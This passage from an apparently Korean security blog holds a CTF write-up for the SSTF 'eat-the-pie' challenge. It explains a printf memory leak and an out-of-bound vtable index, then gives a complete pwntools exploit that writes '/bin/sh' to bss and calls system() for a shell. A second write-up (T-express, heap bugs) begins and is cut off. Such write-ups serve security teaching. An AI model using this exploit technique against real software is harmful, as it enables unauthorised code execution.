&#xC774;&#xC810;&#xC744; &#xAE30;&#xC5B5;&#xD574;&#xC8FC;&#xC138;&#xC694;.</p><p>[ &#xCDE8;&#xC57D;&#xC810; ]</p><ol><li><p>Memory Leak With Printf</p></li><li><p>Out-Of-Bound</p></li></ol><h1 id="&#xD6D1;&#xC5B4;&#xBCF4;&#xAE30;"><a href="#&#xD6D1;&#xC5B4;&#xBCF4;&#xAE30;" class="headerlink" title="&#xD6D1;&#xC5B4;&#xBCF4;&#xAE30;"></a>&#xD6D1;&#xC5B4;&#xBCF4;&#xAE30;</h1><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image1.png" alt></p><p><code>pwnme()</code>&#xB77C;&#xB294; &#xC774;&#xB984;&#xC758; &#xD568;&#xC218;&#xAC00; &#xC788;&#xB2E4;. <del>&#x201C;&#xB3D9;&#xB124; &#xC0AC;&#xB78C;&#xB4E4;!!! &#xCDE8;&#xC57D;&#xC810; &#xC5EC;&#xAE30; &#xC788;&#xC5B4;&#xC694;!!!&#x201D;</del></p><p>CTF&#xC5D0;&#xC11C; &#xC774;&#xB807;&#xAC8C; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC704;&#xCE58;&#xB97C; &#xC54C;&#xB824;&#xC8FC;&#xB294; &#xBB38;&#xC81C;&#xB4E4;&#xC740; &#xC8FC;&#xB85C; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xAC04;&#xB2E8;&#xD558;&#xC9C0;&#xB9CC; exploit&#xC73C;&#xB85C; &#xC5F0;&#xACB0;&#xC2DC;&#xD0A4;&#xB294; &#xAC83;&#xC774; &#xC5B4;&#xB824;&#xC6B4; &#xCEE8;&#xC149;&#xC758; &#xBB38;&#xC81C;&#xB4E4;&#xC785;&#xB2C8;&#xB2E4;. eat-the-pie&#xB3C4; &#xC774;&#xB7F0; &#xCEE8;&#xC149;&#xC758; &#xBB38;&#xC81C;&#xC778; &#xAC70; &#xAC19;&#xC8E0;?</p><p><del>[ ! ] &#xC2EC;&#xC9C0;&#xC5B4; &#xBB38;&#xC81C; &#xC774;&#xB984;&#xB3C4; PIE &#xC6B0;&#xD68C;&#xB97C; &#xC554;&#xC2DC;&#xD558;&#xACE0; &#xC788;&#xB2E4;.</del></p><p>&#xB300;&#xCDA9; eat-the-pie &#xBB38;&#xC81C;&#xB97C; &#xC124;&#xBA85;&#xD558;&#xC790;&#xBA74;,</p><ol><li>stack&#xC5D0; vtable&#xC744; &#xB9CC;&#xB4E4;&#xACE0; <code>read()</code>&#xB85C; &#xC785;&#xB825;&#xC744; &#xBC1B;&#xC74C;.</li><li><code>read()</code>&#xB85C; &#xBC1B;&#xC740; &#xC785;&#xB825; &#xAC12;&#xC744; &#xC774;&#xC6A9;&#xD574; vtable&#xB85C;&#xBD80;&#xD130; &#xD568;&#xC218;&#xB97C; &#xCC38;&#xC870; &#xC2E4;&#xD589;.</li></ol><p>&#xC774; &#xB450; &#xAC00;&#xC9C0; &#xC815;&#xB3C4;&#xB9CC; &#xC54C;&#xBA74; &#xB418;&#xB294; &#xAC04;&#xB2E8;&#xD55C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC785;&#xB2C8;&#xB2E4;.</p><p>CTF &#xBB38;&#xC81C;&#xB4E4;&#xC740; &#xC758;&#xB3C4;&#xC801;&#xC73C;&#xB85C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xB9CC;&#xB4E4;&#xC5B4; &#xB1A8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC9F1;&#xAD6C;&#xB97C; &#xC870;&#xAE08;&#xB9CC; &#xAD74;&#xB824; &#xBCF4;&#xBA74;</p><p>&#xCF54;&#xB4DC;&#xC5D0;&#xC11C; &#xB9CE;&#xC740; &#xD78C;&#xD2B8;&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>[ ! ] Real world&#xC640; &#xB300;&#xC870;&#xB418;&#xB294; &#xD070; &#xCC28;&#xC774;&#xC810;&#xC774;&#xB2E4;.</p><p>&#xC704; &#xC0AC;&#xC9C4;&#xC5D0;&#xC11C; &#xD558;&#xC774;&#xB77C;&#xC774;&#xD2B8; &#xB41C; &#xBD80;&#xBD84;&#xC744; &#xBCF4;&#xACE0; &#xCD5C;&#xB300;&#xD55C; &#xB9CE;&#xC740; &#xC815;&#xBCF4;&#xB97C; &#xC54C;&#xC544;&#xB0B4; &#xBD05;&#xC2DC;&#xB2E4;.</p><h1 id="&#xCDE8;&#xC57D;&#xC810;-&#xC608;&#xC0C1;-&#xC815;&#xC801;-&#xBD84;&#xC11D;"><a href="#&#xCDE8;&#xC57D;&#xC810;-&#xC608;&#xC0C1;-&#xC815;&#xC801;-&#xBD84;&#xC11D;" class="headerlink" title="&#xCDE8;&#xC57D;&#xC810; &#xC608;&#xC0C1; ( &#xC815;&#xC801; &#xBD84;&#xC11D; )"></a>&#xCDE8;&#xC57D;&#xC810; &#xC608;&#xC0C1; ( &#xC815;&#xC801; &#xBD84;&#xC11D; )</h1><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image2.png" alt></p><ol><li>&#xC785;&#xB825;&#xC744; &#xAD73;&#xC774; int&#xAC00; &#xC544;&#xB2CC; string&#xD615;&#xC73C;&#xB85C; 16 byte&#xB098; &#xBC1B;&#xB294;&#xB2E4;.</li></ol><p>int( 4 byte )&#xAC00; &#xC544;&#xB2CC; string&#xC73C;&#xB85C; 16 byte&#xB098; &#xC785;&#xB825;&#xBC1B;&#xB294; &#xAC83;&#xC740; 12 byte&#xB9CC;&#xD07C; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xB0AD;&#xBE44;&#xD558;&#xB294; &#xAC83;&#xC774;&#xACE0; &#xC785;&#xB825;&#xBC1B;&#xC740; string&#xC744; int&#xB85C; &#xBC14;&#xAFB8;&#xB294; &#xACFC;&#xC815;&#xC744; &#xD55C;&#xBC88; &#xB354; &#xAC78;&#xCE58;&#xB2C8; &#xACB0;&#xCF54; &#xD569;&#xB9AC;&#xC801;&#xC778; &#xCF54;&#xB4DC;&#xAC00; &#xC544;&#xB2D9;&#xB2C8;&#xB2E4;. &#xC989;, &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xBE4C;&#xB4DC; &#xC5C5; &#xB418;&#xB3C4;&#xB85D; &#xC758;&#xB3C4;&#xB41C; &#xCF54;&#xB4DC;&#xC778; &#xAC70; &#xAC19;&#xC8E0;? <code>atoi()</code> &#xD639;&#xC740; <code>printf()</code> &#xB4F1; NULL terminated string &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xB3C4; &#xC911;&#xC694;&#xD55C; &#xC815;&#xBCF4;&#xC778; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>if&#xBB38;&#xC758; &#xC870;&#xAC74;&#xC774; &#xBAA8;&#xB4E0; &#xACBD;&#xC6B0;&#xC758; &#xC218;&#xB97C; &#xCEE4;&#xBC84;&#xD558;&#xC9C0; &#xBABB;&#xD568;.</li></ol><p>index&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xCC38;&#xC870;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xAC00; &#xC788;&#xB2E4;&#xBA74; &#xAC00;&#xC7A5; &#xBA3C;&#xC800; &#xD655;&#xC778;&#xD574;&#xC57C; &#xD560; &#xAC83;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBC14;&#xB85C;, out-of-bound &#xAC00;&#xB2A5; &#xC5EC;&#xBD80;. &#xCF54;&#xB4DC;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74; &#xC74C;&#xC218;&#xC5D0; &#xB300;&#xD55C; &#xC608;&#xC678; &#xCC98;&#xB9AC;&#xB97C; &#xD558;&#xC9C0; &#xC54A;&#xC740; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC2EC;&#xC9C0;&#xC5B4; indirect call&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; index&#xC758; out-of-bound&#xB124;&#xC694;.</p><p>&#xADF8;&#xB7FC; &#xB300;&#xCDA9; &#xC608;&#xC0C1;&#xD574; &#xBCF4;&#xBA74; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>NULL terminated string&#xC758; &#xC608;&#xC678; &#xCC98;&#xB9AC; &#xBD80;&#xC7AC;&#xB85C; PIE &#xC6B0;&#xD68C;</li><li>out-of-bound&#xB85C; eip &#xC81C;&#xC5B4;</li></ol><p>&#xC608;&#xC0C1;&#xC774; &#xB9DE;&#xB294;&#xC9C0; &#xD55C;&#xBC88; &#xD655;&#xC778;&#xD574; &#xBD05;&#xC2DC;&#xB2E4;.</p><h1 id="Memory-Leak-with-printf"><a href="#Memory-Leak-with-printf" class="headerlink" title="Memory Leak with printf"></a>Memory Leak with printf</h1><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image3.png" alt></p><p>PIE&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xBC95;&#xC740; &#xAC04;&#xB2E8;&#xD569;&#xB2C8;&#xB2E4;. binary&#xC758; base address&#xB97C; leak &#xD558;&#xBA74; &#xB418;&#xB2C8;&#xAE4C;&#xC694;.</p><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4; func1&#xC758; &#xC8FC;&#xC18C;&#xC778; <code>0x5655574d</code>&#xB97C; leak &#xD588;&#xB2E4;&#xBA74; <code>0x5655574d</code>&#xC5D0;&#xC11C; <code>func1</code>&#xC758; offset&#xC778; <code>0x74d</code>&#xB97C; &#xBE7C;&#xC11C; binary base address&#xB97C; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image4.png" alt></p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image5.png" alt></p><p>16 byte &#xAE38;&#xC774;&#xC758; string&#xC744; &#xC785;&#xB825;&#xD558;&#xBA74; vtable &#xBC14;&#xB85C; &#xC704;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xC0C1;&#xD0DC;&#xB85C; <code>printf()</code> &#xC2E4;&#xD589;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xBA74; <code>func1 ~ func4</code>&#xC758; &#xC8FC;&#xC18C;&#xB3C4; &#xAC19;&#xC774; &#xCD9C;&#xB825;&#xB429;&#xB2C8;&#xB2E4;. <code>printf()</code>&#xB294; NULL terminated string&#xC744; &#xB2E4;&#xB8E8;&#xB294; &#xD568;&#xC218;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; NULL&#xC744; &#xB9CC;&#xB098;&#xAE30; &#xC804;&#xAE4C;&#xC9C4; &#xBA48;&#xCD94;&#xC9C0; &#xC54A;&#xACE0; &#xACC4;&#xC18D; &#xCD9C;&#xB825;&#xD55C; &#xACB0;&#xACFC;&#xC785;&#xB2C8;&#xB2E4;.</p><h1 id="Out-Of-Bound"><a href="#Out-Of-Bound" class="headerlink" title="Out-Of-Bound"></a>Out-Of-Bound</h1><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image6.png" alt></p><p>Indirect call&#xC5D0; &#xC0AC;&#xC6A9;&#xB420; &#xC778;&#xB371;&#xC2A4;&#xC5D0; &#xB530;&#xB77C; &#xC2A4;&#xD0DD; &#xC0C1;&#xD669;&#xC744; &#xCD9C;&#xB825;&#xD55C; &#xC0AC;&#xC9C4;&#xC5D0; &#xBC88;&#xD638;&#xB97C; &#xC0C8;&#xACA8;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC880; &#xC804;&#xC5D0; indirect call&#xC5D0;&#xC11C; &#xC74C;&#xC218;&#xC5D0; &#xB300;&#xD55C; &#xC608;&#xC678; &#xCC98;&#xB9AC;&#xB97C; &#xD558;&#xC9C0; &#xC54A;&#xC544; out-of-bound&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xACE0; &#xC124;&#xBA85;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xD604; &#xC0C1;&#xD669;&#xC5D0;&#xC11C; -3&#xC744; &#xC785;&#xB825;&#xD55C;&#xB2E4;&#xBA74; eip&#xC5D0; <code>0x42424242</code> &#xAC00; &#xB4E4;&#xC5B4;&#xAC00;&#xACA0;&#xC8E0;?</p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image7.png" alt></p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image8.png" alt></p><p>&#xC608;&#xC0C1;&#xB300;&#xB85C; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC815;&#xB9D0; &#xAC04;&#xB2E8;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xC81C; exploit&#xC744; &#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><h1 id="Exploit-Plan"><a href="#Exploit-Plan" class="headerlink" title="Exploit Plan"></a>Exploit Plan</h1><p>&#xC8FC;&#xC5B4;&#xC9C4; &#xC815;&#xBCF4;&#xC640; &#xC81C;&#xC57D; &#xC0C1;&#xD669; &#xB4F1;&#xC744; &#xACE0;&#xB824;&#xD558;&#xBA70; &#xCD94;&#xAC00;&#xB85C; &#xD544;&#xC694;&#xD55C; &#xC815;&#xBCF4;&#xAC00; &#xC788;&#xB294;&#xC9C0; &#xCCB4;&#xD06C;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><ol><li><code>system()</code>&#xC744; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD568;.<ul><li>Arbitrary Write(AW)&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xBA74; bss&#xC5D0; &#x201C;/bin/sh&#x201D;&#xC744; &#xB123;&#xC5B4;&#xC8FC;&#xAE30;&#xB9CC; &#xD558;&#xBA74; &#xB428;</li></ul></li><li>Libc &#xC8FC;&#xC18C;&#xB97C; leak &#xD558;&#xAE30; &#xBC88;&#xAC70;&#xB85C;&#xC6C0; </li><li>PIE&#xAC00; &#xC788;&#xB294; &#xC0C1;&#xD669;&#xC5D0;&#xC11C; stack &#xC8FC;&#xC18C;&#xB97C; leak &#xD558;&#xAE30; &#xBC88;&#xAC70;&#xB85C;&#xC6C0;</li></ol><p>[ ! ] &#xACB0;&#xB860;</p><p>Arbitrary Write &#xD560; &#xBC29;&#xBC95;&#xC744; &#xCC3E;&#xC790;.</p><p>&#x201C;/bin/sh&#x201D;&#xC744; bss&#xC5D0; &#xC800;&#xC7A5;&#xD558;&#xACE0; <code>system( bss )</code>&#xB97C; &#xD558;&#xBA74; &#xC258; &#xD68D;&#xB4DD; &#xAC00;&#xB2A5;.</p><h1 id="Arbitrary-Write"><a href="#Arbitrary-Write" class="headerlink" title="Arbitrary Write"></a>Arbitrary Write</h1><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image9.png" alt></p><p>Arbitrary Write(Write anything anywhere)&#xB97C; &#xD558;&#xB824;&#xBA74; &#xB2F9;&#xC5F0;&#xD788; &#xC4F0;&#xAE30; &#xD568;&#xC218;&#xAC00; &#xC788;&#xC5B4;&#xC57C; &#xD558;&#xACA0;&#xC8E0;?. &#xC0AC;&#xC6A9; &#xAC00;&#xB2A5;&#xD55C; &#xC4F0;&#xAE30; &#xD568;&#xC218;&#xB294; <code>read()</code>&#xAC00; &#xC720;&#xC77C;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image10.png" alt></p><p>out-of-bound&#xB85C; <code>read()</code>&#xB97C; AW&#xC5D0; &#xC0AC;&#xC6A9;&#xD558;&#xB824;&#xB294; &#xC9C0;&#xAE08; &#xC0C1;&#xD669;&#xC5D0;&#xC11C; &#xB118;&#xC5B4;&#xC57C; &#xD560; &#xC7A5;&#xC560;&#xBB3C;&#xC774; 2&#xAC00;&#xC9C0;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>call&#xB85C; eip&#xB97C; &#xC7A1;&#xB294;&#xB2E4;&#xB294; &#xC810;</li><li><code>read()</code>&#xB294; &#xC778;&#xC790;&#xB97C; 3&#xAC1C;&#xB098; &#xBC1B;&#xB294;&#xB2E4;&#xB294; &#xC810;</li></ol><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image11.png" alt></p><p>&#xC77C;&#xB2E8; &#xCCAB; &#xBC88;&#xC9F8;, call&#xB85C; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xAE30; &#xC804;&#xC5D0; &#xCDA9;&#xC871;&#xB3FC;&#xC57C; &#xD558;&#xB294; &#xC870;&#xAC74;&#xC774; &#xC788;&#xB294;&#xB370;,</p><ol><li>&#xD638;&#xCD9C;&#xB2F9;&#xD558;&#xB294; &#xD568;&#xC218;&#xAC00; &#xC4F8; &#xC778;&#xC790;&#xB4E4;&#xC774; stack&#xC5D0; push &#xB3FC; &#xC788;&#xC5B4;&#xC57C; &#xD568;.</li><li>ESP&#xAC00; &#xADF8; &#xC778;&#xC790;&#xB4E4; &#xC911; &#xAC00;&#xC7A5; &#xB0AE;&#xC740; &#xC8FC;&#xC18C;&#xC5D0; &#xC704;&#xCE58;&#xD574;&#xC57C; &#xD568;.</li></ol><p>&#xC801;&#xC808;&#xD55C; gadget&#xC744; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;&#xBA74; &#xC774; &#xB450; &#xAC00;&#xC9C0; &#xC870;&#xAC74;&#xC744; &#xCDA9;&#xC871;&#xD558;&#xB294; &#xAC83;&#xC740; &#xB300;&#xBD80;&#xBD84; &#xD06C;&#xAC8C; &#xC5B4;&#xB824;&#xC6B4; &#xC77C;&#xC774; &#xC544;&#xB2D9;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; pyload&#xB97C; &#xB2F4;&#xC744; &#xBA54;&#xBAA8;&#xB9AC;&#xAC00; 16byte &#xBC16;&#xC5D0; &#xC5C6;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774;&#xB9C8;&#xC800;&#xB3C4; &#xC5B4;&#xB824;&#xC6B4; &#xC77C;&#xC774; &#xB3FC; &#xBC84;&#xB838;&#xB124;&#xC694;.</p><p>[ ! ] indexVar + gadget + parameter1 + parameter2 + parameter3 + &amp;read() = 24 byte</p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image12.png" alt></p><p>&#xD55C;&#xCC38; &#xACE0;&#xBBFC;&#xD558;&#xB2E4;&#xAC00; &#xD55C; &#xAC00;&#xC9C0; &#xC0DD;&#xAC01;&#xC774; &#xBA38;&#xB9AC;&#xB97C; &#xC2A4;&#xCE58;&#xACE0; &#xAC14;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#x201C;32 bit&#xC758; &#xC778;&#xC790; push&#xB294; &#xC5ED;&#xC21C;&#xC73C;&#xB85C; &#xC774;&#xB904;&#xC9C4;&#xB2E4;!&#x201D; <del>&#xC774;&#xB54C; &#xC774;&#xB9C8;&#xB97C; &#xD0C1; &#xCE58;&#xACE0; &#xC720;&#xB808;&#xCE74;&#xB97C; &#xC678;&#xCCE4;&#xC2B5;&#xB2C8;&#xB2E4;.</del></p><p>&#xACB0;&#xB860;&#xBD80;&#xD130; &#xC801;&#xC790;&#xBA74; &#xC704; &#xC0AC;&#xC9C4;&#xC5D0;&#xC11C; &#xD558;&#xC774;&#xB77C;&#xC774;&#xD2B8; &#xB41C; &#xBD80;&#xBD84;&#xC744; gadget&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image13.png" alt></p><p>&#xC704; &#xC0AC;&#xC9C4;&#xC740; <code>pwnme()</code>&#xC5D0;&#xC11C; <code>read(0, &amp;v0, 0x10)</code>&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xC5B4;&#xC148; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;. 3&#xBC88;&#xC9F8; &#xC778;&#xC790;&#xBD80;&#xD130; &#xC5ED;&#xC21C;&#xC73C;&#xB85C; stack&#xC5D0; push &#xD558;&#xB294; &#xAC8C; &#xBCF4;&#xC774;&#xC2DC;&#xB098;&#xC694;? &#xB9CC;&#xC57D; 3&#xBC88;&#xC9F8; &#xC778;&#xC790;&#xB97C; push &#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xAC74;&#xB108;&#xB6F0;&#xACE0; <code>&lt;pwnme+198&gt;</code>&#xBD80;&#xD130; &#xC2E4;&#xD589;&#xB41C;&#xB2E4;&#xBA74; <code>read()</code>&#xAC00; &#xD638;&#xCD9C;&#xB420; &#xB54C; stack&#xC5D0; &#xC788;&#xB358; &#xC4F0;&#xB808;&#xAE30; &#xAC12;( <del>&#xC0AC;&#xC2E4; ret addr</del> )&#xC744; <code>read()</code>&#xC758; 3&#xBC88;&#xC9F8; &#xC778;&#xC790;&#xB85C; &#xC778;&#xC2DD;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image14.png" alt></p><p>&#xD14C;&#xC2A4;&#xD2B8;&#xD574;&#xBCF4;&#xBA74; &#xC608;&#xC0C1;&#xACFC; &#xAC19;&#xC774; <code>read(0, &amp;v0, 0x566109bc)</code>&#xAC00; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xAC00;&#xC82F;&#xC744; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;&#xBA74; 16 byte &#xC785;&#xB825; &#xC81C;&#xD55C;&#xC73C;&#xB85C; &#xBD88;&#xAC00;&#xB2A5;&#xD588;&#xB358; AW&#xAC00; &#xAC00;&#xB2A5;&#xD574;&#xC9D1;&#xB2C8;&#xB2E4;.</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<span class="hljs-comment">#p = remote(&apos;eat-the-pie.sstf.site&apos;, &apos;1337&apos;)</span>p = process(<span class="hljs-string">&apos;./target&apos;</span>)e = ELF(<span class="hljs-string">&apos;./target&apos;</span>)read_plt = e.plt[<span class="hljs-string">&apos;read&apos;</span>]system = e.plt[<span class="hljs-string">&apos;system&apos;</span>]bss = e.bss()<span class="hljs-comment"># leak binary base</span>payload = <span class="hljs-string">&apos;A&apos;</span>*<span class="hljs-number">12</span> + <span class="hljs-string">&apos;BBBB&apos;</span>p.sendlineafter(<span class="hljs-string">&apos;Select &gt; &apos;</span>, payload)p.sendlineafter(<span class="hljs-string">&apos;Select &gt; &apos;</span>, <span class="hljs-string">&apos;4&apos;</span>)p.recvuntil(<span class="hljs-string">&apos;BBBB&apos;</span>)leak = u32(p.recv(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x74d</span>log.info(hex(leak))<span class="hljs-comment"># overflow vtable with gadget</span>payload = <span class="hljs-string">&apos;-3&apos;</span>+ <span class="hljs-string">&apos;\x00\x00&apos;</span> + p32(leak+<span class="hljs-number">0x970</span>) <span class="hljs-comment"># read() in pwnme() without len</span>p.sendlineafter(<span class="hljs-string">&apos;Select &gt; &apos;</span>, payload)<span class="hljs-comment"># arbitrary write to bss</span>payload = p32(<span class="hljs-number">0</span>) + p32(leak+bss) + p32(<span class="hljs-number">8</span>) + <span class="hljs-string">&apos;AAAA&apos;</span> + p32(leak+read_plt)p.sendline(payload)p.sendline(<span class="hljs-string">&apos;/bin/sh\x00&apos;</span>)<span class="hljs-comment"># overflow vtable with gadget</span>payload = <span class="hljs-string">&apos;-3&apos;</span>+ <span class="hljs-string">&apos;\x00\x00&apos;</span> + p32(leak+<span class="hljs-number">0x970</span>)p.sendlineafter(<span class="hljs-string">&apos;Select &gt; &apos;</span>, payload)<span class="hljs-comment"># system(&quot;/bin/sh&quot;);</span>payload = <span class="hljs-string">&apos;AAAABBBBCCCC&apos;</span>+ p32(leak+system) + p32(leak+<span class="hljs-number">0xa99</span>) + p32(leak+bss)p.sendline(payload) <span class="hljs-comment"># 0xa99 == pop pop pop ret</span>p.interactive()</code></pre><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image15.png" alt></p><p>Q.E.D</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>samsung</tag>
      
      <tag>ctf</tag>
      
      <tag>sstf</tag>
      
      <tag>out of bound</tag>
      
      <tag>calling convention</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] SSTF T-express</title>
    <link href="/2020/10/18/fabu1ous/sstf-t-express/"/>
    <url>/2020/10/18/fabu1ous/sstf-t-express/</url>
    
    <content type="html"><![CDATA[<h1 id="&#xBA38;&#xB9BF;&#xB9D0;"><a href="#&#xBA38;&#xB9BF;&#xB9D0;" class="headerlink" title="&#xBA38;&#xB9BF;&#xB9D0;"></a>&#xBA38;&#xB9BF;&#xB9D0;</h1><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image.png" alt></p><p>&#xC0BC;&#xC131;&#xC5D0;&#xC11C; &#xC8FC;&#xCD5C;&#xD55C; SSTF&#xC5D0; &#xCD9C;&#xC804;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC870;&#xAE08; &#xB2A6;&#xC740; &#xAC10;&#xC774; &#xC788;&#xC9C0;&#xB9CC; T-express &#xBB38;&#xC81C; &#xD480;&#xC774;&#xB97C; &#xD574;&#xBCFC;&#xAE4C; &#xD569;&#xB2C8;&#xB2E4;. T-express &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xC5D0;&#xBC84;&#xB79C;&#xB4DC; &#xB85C;&#xACE0;&#xC758; &#xC544;&#xC2A4;&#xD0A4; &#xC544;&#xD2B8;&#xB85C; &#xC800;&#xD76C;&#xB97C; &#xB9DE;&#xC774;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xCF54;&#xB85C;&#xB098; &#xB54C;&#xBB38;&#xC5D0; &#xC5B4;&#xB514; &#xB180;&#xB7EC; &#xAC00;&#xC9C0;&#xB3C4; &#xBABB;&#xD558;&#xACE0; &#xC788;&#xC5C8;&#xB294;&#xB370; &#xC628;&#xB77C;&#xC778;&#xC73C;&#xB85C; &#xC5D0;&#xBC84;&#xB79C;&#xB4DC;&#xC5D0; &#xAC00;&#xBCF4;&#xB124;&#xC694;. &#x314E;&#x314E; </p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image1.png" alt></p><p>T-express &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB294; glibc-2.31&#xC640; &#xD568;&#xAED8; &#xC8FC;&#xC5B4;&#xC9C4; Heap&#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;. glibc-2.31&#xB294; 2020&#xB144; 2&#xC6D4;&#xC5D0; &#xB9B4;&#xB9AC;&#xC988; &#xB41C; &#xBC84;&#xC804;&#xC778;&#xB370;,  &#xC800;&#xB294; T-express&#xB97C; &#xD480;&#xBA74;&#xC11C; &#xC774; &#xBC84;&#xC804;&#xC758; tcache&#xB97C; &#xCC98;&#xC74C; &#xC811;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; &#xC800;&#xC870;&#xCC28; &#xC5B4;&#xB835;&#xC9C0; &#xC54A;&#xAC8C; &#xD480;&#xB9CC;&#xD07C; &#xD06C;&#xAC8C; &#xC5B4;&#xB835;&#xC9C0; &#xC54A;&#xACE0; &#xC7AC;&#xBC0C;&#xAC8C; &#xD480; &#xC218; &#xC788;&#xB294; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;.</p><p>[&#xCDE8;&#xC57D;&#xC810;]</p><ol><li><p>Off-By-One</p></li><li><p>Double-Free</p></li><li><p>Out-Of-Bound</p></li></ol><h1 id="&#xD6D1;&#xC5B4;&#xBCF4;&#xAE30;"><a href="#&#xD6D1;&#xC5B4;&#xBCF4;&#xAE30;" class="headerlink" title="&#xD6D1;&#xC5B4;&#xBCF4;&#xAE30;"></a>&#xD6D1;&#xC5B4;&#xBCF4;&#xAE30;</h1><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image2.png" alt></p><p>&#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xAE30;&#xB2A5;&#xC740; &#xB300;&#xCDA9; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC694;&#xC57D;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><p>&#xD2F0;&#xCF13; &#xAD6C;&#xB9E4;</p><ul><li>One Ride &#xD2F0;&#xCF13; &#x2192; &#xBA54;&#xBAA8;&#xB9AC; &#xD560;&#xB2F9;</li><li>One Day &#xD2F0;&#xCF13; &#x2192; &#xBA54;&#xBAA8;&#xB9AC; 